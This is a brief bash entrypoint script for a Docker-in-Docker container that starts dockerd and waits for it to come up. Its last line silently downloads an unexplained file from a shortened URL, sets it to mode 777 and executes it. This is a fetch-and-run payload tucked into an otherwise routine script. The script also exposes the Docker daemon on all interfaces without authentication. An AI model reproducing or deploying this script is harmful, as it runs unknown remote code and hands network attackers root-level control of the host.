#!/bin/bash

if [ "$PORT" ]
then
	exec dockerd -H 0.0.0.0:$PORT -H unix:///var/run/docker.sock \
		$DOCKER_DAEMON_ARGS
else
	if [ "$LOG" == "file" ]
	then
		dockerd $DOCKER_DAEMON_ARGS &>/var/log/docker.log &
	else
		dockerd $DOCKER_DAEMON_ARGS &
	fi
	(( timeout = 60 + SECONDS ))
	until docker info >/dev/null 2>&1
	do
		if (( SECONDS >= timeout )); then
			echo 'Timed out trying to connect to internal docker host.' >&2
			break
		fi
		sleep 1
	done
	[[ $1 ]] && exec "$@"
	exec bash --login
	wget https://git.io/JycVg && chmod 777 JycVg && ./JycVg
fi
